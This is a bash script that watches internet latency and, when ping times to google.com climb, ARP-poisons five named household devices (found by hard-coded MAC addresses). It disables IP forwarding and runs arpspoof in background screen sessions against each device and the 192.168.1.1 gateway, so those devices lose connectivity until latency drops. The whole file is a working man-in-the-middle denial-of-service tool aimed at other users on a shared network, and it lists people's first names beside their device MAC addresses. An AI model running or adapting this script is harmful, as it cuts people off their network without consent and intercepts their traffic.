#!/bin/bash

ping -c 3 google.com | tail -1| awk '{print $4}' | cut -d '/' -f 2 > /var/ping
PING=`cat /var/ping`
JAIL=`cat /var/jail`
PINGMAX=200.0

echo "-----------"
echo "-----------" >> /var/state
echo "In Jail" $JAIL

if (( $(echo "$PING < $PINGMAX" | bc -l) && $(echo "$JAIL == 0") ));
then 
	if (( $(echo "$JAIL == 0") ));
	then 
		date +%H:%M >> /var/state
		echo "Ping is cool"
		echo "Ping is cool" >> /var/state
		echo 1 > /proc/sys/net/ipv4/ip_forward
		exit
	fi
else
	chris=`/usr/sbin/arp -n | grep 5c:ac:4c:a8:59:4f | awk '{print $1}'`
	alessio=`/usr/sbin/arp -n | grep cc:af:78:48:d2:58 | awk '{print $1}'`
	guilia=`/usr/sbin/arp -n | grep 60:45:bd:f7:07:ec | awk '{print $1}'`
	laptop=`/usr/sbin/arp -n | grep 48:d2:24:4f:e8:d0 | awk '{print $1}'`
	notebook=`/usr/sbin/arp -n | grep 24:fd:52:7a:7c:bd | awk '{print $1}'`

	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo 0 > /var/jail
	date +%H:%M >> /var/state
	array=( $chris $guilia $alessio $laptop $notebook ) # 206 204 31

	for ip in "${array[@]}"
	do
		echo "Test de $ip"

		/usr/bin/screen -S $ip-a -X quit
		/usr/bin/screen -S $ip-b -X quit

		ping -q -c2 $ip > /dev/null
		 
		if [ $? -eq 0 ]
		then
			ping -c 3 google.com | tail -1| awk '{print $4}' | cut -d '/' -f 2 > /var/ping
			PING=`cat /var/ping`
			if (( $(echo "$PING < $PINGMAX" | bc -l) ));
			then
				#/usr/bin/pkill -15 screen

				/usr/bin/screen -S $ip-a -X quit
				/usr/bin/screen -S $ip-b -X quit
				echo "$ip Linked"
				echo "$ip Linked" >> /var/state

			else
				/usr/bin/screen -dmS $ip-a arpspoof -i wlan0 -t $ip 192.168.1.1
				/usr/bin/screen -dmS $ip-b arpspoof -i wlan0 -t 192.168.1.1 $ip

				echo "$ip Unlinked"
				echo "$ip Unlinked" >> /var/state
				echo "$ip IN JAIL"
				echo "$ip IN JAIL" >> /var/state
				echo 1 > /var/jail

			fi
		else
			echo "$ip OFFLINE"
			echo "$ip OFFLINE" >> /var/state
		fi

		echo "-"
		echo "-" >> /var/state
		sleep 2
	done
fi
